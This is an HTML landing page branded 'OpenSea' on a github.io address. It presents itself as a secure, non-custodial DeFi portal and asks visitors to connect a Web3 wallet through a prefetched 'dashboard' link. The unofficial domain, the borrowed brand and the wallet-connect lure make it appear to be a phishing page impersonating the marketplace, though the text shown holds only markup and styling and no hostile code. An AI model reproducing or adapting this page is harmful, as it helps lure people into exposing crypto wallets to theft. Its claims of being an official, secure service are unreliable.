<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>OpenSea - Decentralized DeFi Portal</title>
  <meta name="description" content="Secure, non-custodial portal for OpenSea DeFi operations directly from your own wallet.">
  <link rel="canonical" href="https://opensea-site.github.io/">
  <meta name="robots" content="index,follow">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
  <style>


@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

:root{
  --bg:#F6F8FB;
  --surface:#FFFFFF;
  --surface-soft:#F1F4F8;
  --ink:#101419;
  --muted:#66717F;
  --faint:#A0A8B3;
  --accent:#2081E2;
  --accent-soft:rgba(32,129,226,.10);
  --line:rgba(16,20,25,.10);
  --line-strong:rgba(16,20,25,.16);
  --shadow:0 28px 70px -34px rgba(16,20,25,.34);
}

*{box-sizing:border-box}
html,body{height:100%}
html{overflow:hidden}
body{
  margin:0;
  min-height:100dvh;
  overflow:hidden;
  color:var(--ink);
  font-family:'Inter',system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
  line-height:1.5;
  background:
    radial-gradient(58% 44% at 50% -12%, rgba(32,129,226,.12), transparent 64%),
    linear-gradient(180deg,#FFFFFF 0%,var(--bg) 72%);
  -webkit-font-smoothing:antialiased;
  display:flex;
  flex-direction:column;
}

a{color:inherit;text-decoration:none}
img{display:block;max-width:100%}
p,h1{margin:0}

.topbar{
  flex:0 0 auto;
  display:flex;
  align-items:center;
  gap:18px;
  width:100%;
  padding:18px clamp(18px,4vw,42px);
}

.brand{
  display:flex;
  align-items:center;
  gap:10px;
  min-width:0;
  color:var(--ink);
  font-size:1.05rem;
  font-weight:800;
}

.brand img{
  flex:none;
  border-radius:9px;
  box-shadow:0 1px 0 rgba(16,20,25,.08);
}

.brand span{white-space:nowrap}

.nav{
  display:flex;
  align-items:center;
  gap:24px;
  margin-left:8px;
}

.nav a{
  color:var(--muted);
  font-size:.92rem;
  font-weight:600;
  transition:color .16s ease;
}

.nav a:hover{color:var(--ink)}

.spacer{flex:1}

.ghost{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  min-height:40px;
  padding:0 18px;
  border:1px solid var(--line-strong);
  border-radius:999px;
  color:var(--ink);
  background:rgba(255,255,255,.70);
  font-size:.92rem;
  font-weight:700;
  box-shadow:0 12px 32px -26px rgba(16,20,25,.30);
  transition:transform .14s ease,border-color .16s ease,background .16s ease;
}

.ghost:hover{
  transform:translateY(-1px);
  border-color:rgba(32,129,226,.38);
  background:#FFFFFF;
}

.stage{
  flex:1 1 auto;
  min-height:0;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  width:100%;
  padding:8px clamp(18px,4vw,42px) 10px;
  text-align:center;
}

.hero{
  display:flex;
  flex-direction:column;
  align-items:center;
}

h1{
  font-size:clamp(3rem,6vw,4.6rem);
  line-height:1.02;
  letter-spacing:0;
  font-weight:800;
}

.sub{
  max-width:54ch;
  margin-top:16px;
  color:var(--muted);
  font-size:clamp(1.02rem,1.45vw,1.18rem);
}

.sub strong{
  color:var(--ink);
  font-weight:800;
  box-shadow:inset 0 -.45em 0 var(--accent-soft);
}

.app-card{
  width:min(420px,100%);
  margin-top:28px;
  padding:18px;
  border:1px solid var(--line);
  border-radius:22px;
  background:rgba(255,255,255,.92);
  box-shadow:var(--shadow);
}

.nft-tile{
  position:relative;
  width:100%;
  aspect-ratio:1/1;
  max-height:218px;
  overflow:hidden;
  border:1px solid var(--line);
  border-radius:18px;
  background:
    linear-gradient(135deg,rgba(255,255,255,.56),transparent 42%),
    radial-gradient(circle at 28% 22%,rgba(32,129,226,.14),transparent 34%),
    var(--surface-soft);
}

.tile-mark{
  position:absolute;
  inset:18%;
  border:1px solid rgba(16,20,25,.08);
  border-radius:16px;
  background:
    linear-gradient(145deg,rgba(255,255,255,.72),rgba(255,255,255,.12)),
    repeating-linear-gradient(135deg,rgba(16,20,25,.045) 0,rgba(16,20,25,.045) 1px,transparent 1px,transparent 13px);
}

.market-row{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:12px;
  margin-top:15px;
  padding:13px 14px;
  border:1px solid var(--line);
  border-radius:15px;
  background:#FFFFFF;
  text-align:left;
}

.market-copy{
  min-width:0;
  color:var(--ink);
  font-size:.98rem;
  font-weight:800;
}

.eth-chip{
  flex:none;
  display:inline-flex;
  align-items:center;
  gap:7px;
  min-height:34px;
  padding:0 10px;
  border:1px solid var(--line);
  border-radius:999px;
  background:var(--surface-soft);
  color:var(--ink);
  font-size:.86rem;
  font-weight:800;
}

.eth-chip img{border-radius:50%}

.mode{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:6px;
  margin-top:12px;
  padding:5px;
  border:1px solid var(--line);
  border-radius:14px;
  background:var(--surface-soft);
}

.mode-btn{
  min-height:36px;
  border:0;
  border-radius:10px;
  background:transparent;
  color:var(--muted);
  font:inherit;
  font-size:.9rem;
  font-weight:800;
  cursor:pointer;
  transition:background .16s ease,color .16s ease,box-shadow .16s ease;
}

.mode-btn.active{
  background:#FFFFFF;
  color:var(--accent);
  box-shadow:0 10px 24px -20px rgba(16,20,25,.35);
}

.primary{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  width:100%;
  min-height:54px;
  margin-top:14px;
  border-radius:15px;
  background:var(--accent);
  color:#FFFFFF;
  font-size:1.03rem;
  font-weight:800;
  transition:transform .14s ease,background .16s ease,box-shadow .16s ease;
}

.primary:hover{
  transform:translateY(-1px);
  background:var(--accent);
  box-shadow:0 16px 34px -24px rgba(32,129,226,.65);
}

.foot{
  flex:0 0 auto;
  padding:12px 24px 22px;
  color:var(--faint);
  font-size:.86rem;
  font-weight:600;
  text-align:center;
}

@media(max-width:720px){
  .topbar{gap:12px;padding:14px 16px}
  .nav{display:none}
  .brand{font-size:.98rem}
  .ghost{min-height:38px;padding:0 14px;font-size:.88rem}
  .stage{padding:4px 16px 8px}
  h1{font-size:2.72rem}
  .sub{max-width:32ch;margin-top:12px;font-size:.98rem;line-height:1.48}
  .app-card{margin-top:18px;padding:14px;border-radius:20px}
  .nft-tile{max-height:176px;border-radius:16px}
  .market-row{margin-top:12px;padding:11px 12px}
  .market-copy{font-size:.88rem}
  .eth-chip{min-height:31px;padding:0 9px;font-size:.8rem}
  .mode{margin-top:10px}
  .mode-btn{min-height:34px}
  .primary{min-height:50px;margin-top:12px}
  .foot{padding:9px 18px 14px;font-size:.8rem}
}

@media(max-width:390px){
  .brand span{max-width:132px;overflow:hidden;text-overflow:ellipsis}
  .ghost{padding:0 12px}
  h1{font-size:2.48rem}
  .sub{font-size:.94rem}
  .app-card{margin-top:15px}
  .nft-tile{max-height:156px}
}


  
.footer {
  text-align: center !important;
}
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>OpenSea</span>
    </div>
    <span class="spacer"></span>
    <nav class="nav" aria-label="Main Navigation">
      <a href="how-it-works/">How it works</a>
      <a href="faq/">FAQ</a>
      <a href="about/">About</a>
      <a href="security/">Security</a>
      <a href="supported-chains/">Supported Chains</a>
    </nav>
  </header>
  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">OpenSea</h1>
    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
  </main>
  <footer class="footer">OpenSea &mdash; 2026</footer>
</body>
</html>
